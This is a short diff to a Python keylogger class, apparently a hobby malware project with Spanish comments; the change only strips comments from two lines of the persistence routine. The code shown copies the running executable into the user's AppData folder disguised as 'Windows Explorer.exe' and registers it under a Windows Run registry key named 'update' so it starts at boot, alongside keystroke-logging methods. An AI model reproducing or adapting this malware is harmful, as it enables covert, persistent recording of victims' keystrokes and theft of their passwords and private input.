@@ -16,8 +16,8 @@ class Keylogger:
 	def become_persistent(self):# Hace que el malware sea persistente. Inicia el malware al momento que la victima enciende su equipo
 		evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe" # Obteniendo ruta alterna al malware
 		if not os.path.exists(evil_file_location):
-			shutil.copyfile(sys.executable,evil_file_location)# copiar el ejecutable actualmente corriendo a la ruta alterna. sys.executable ruta al archivo .exe
-			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location +'"',shell=True)# Agregando un valor al registro de la PC victima
+			shutil.copyfile(sys.executable,evil_file_location)
+			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location +'"',shell=True)
 	def append_to_log(self,string):
 		self.log=self.log+string
 	def process_key_press(self,key):
